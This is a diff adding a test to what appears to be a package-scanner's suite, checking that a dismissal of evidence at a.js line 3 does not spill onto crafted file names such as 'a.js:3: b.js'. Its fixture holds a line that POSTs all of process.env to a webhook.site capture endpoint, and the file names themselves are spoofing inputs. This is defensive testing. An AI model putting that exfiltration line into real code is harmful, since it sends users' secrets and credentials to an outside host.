@@ -70,6 +70,36 @@ describe("dismissed evidence", () => {
     for (const d of [{ ...item, line: 2 }, { ...item, file: "other.js" }, { ...item, signal: "network" }]) expect(finalize(applyDismissals(deny, [d]), STATE).score).toBe(97);
   });
 
+  test("a dismissal of a.js line 3 does not reach a file named `a.js:3: b.js`, whose evidence reads the same at its start", () => {
+    const payload = "const os = require('os');\nfetch('https://webhook.site/abc', { method: 'POST', body: JSON.stringify(process.env) });\n";
+    const a = scored({ "index.js": "require('./a.js');\n", "a.js": "// one\n// two\n// three\n", "a.js:3: b.js": payload });
+    const before = finalize(a, STATE).score;
+
+    expect(a.signals.find((s) => s.id === "capture-endpoint")?.evidence).toEqual([expect.stringMatching(/^a\.js:3: b\.js:2: /)]);
+    const after = applyDismissals(a, [{ scorer: a.scorer, signal: "capture-endpoint", file: "a.js", line: 3, reason: "a docs link", at: 1 }]);
+
+    expect(after.signals.some((s) => s.id === "capture-endpoint")).toBe(true);
+    expect(after.dismissed ?? []).toEqual([]);
+    expect(finalize(after, STATE).score).toBe(before);
+
+    // when a.js line 3 has evidence of its own, the dismissal takes that line and only that line
+    const both = scored({ "index.js": "require('./a.js');\n", "a.js": "// one\n// two\nconst docs = 'https://webhook.site/docs';\n", "a.js:3: b.js": payload });
+    const left = applyDismissals(both, [{ scorer: both.scorer, signal: "capture-endpoint", file: "a.js", line: 3, reason: "a docs link", at: 1 }]);
+
+    expect(both.signals.find((s) => s.id === "capture-endpoint")?.evidence).toHaveLength(2);
+    expect(left.signals.find((s) => s.id === "capture-endpoint")?.evidence).toEqual([expect.stringMatching(/^a\.js:3: b\.js:2: /)]);
+    expect(left.dismissed?.flatMap((d) => d.evidence)).toEqual([expect.stringMatching(/^a\.js:3: const docs/)]);
+
+    // nor a name whose line number is zero-padded, or that has a newline in it
+    for (const name of ["a.js:03: b.js", "a.js:3: b\nc.js"]) {
+      const odd = scored({ "index.js": "require('./a.js');\n", "a.js": "// one\n// two\n// three\n", [name]: payload });
+      const kept = applyDismissals(odd, [{ scorer: odd.scorer, signal: "capture-endpoint", file: "a.js", line: 3, reason: "a docs link", at: 1 }]);
+
+      expect(odd.signals.find((s) => s.id === "capture-endpoint")?.evidence).toEqual([expect.stringMatching(/^a\.js:0?3: b/)]);
+      expect(kept.signals.some((s) => s.id === "capture-endpoint")).toBe(true);
+    }
+  });
+
   test("a fact like an install script cannot be dismissed", () => {
     const a = { ...deny, signals: [...deny.signals, { id: "install-script" as const, label: "x", points: -15, evidence: ["index.js:1: y"], confidence: "confirmed" as const }] };
 
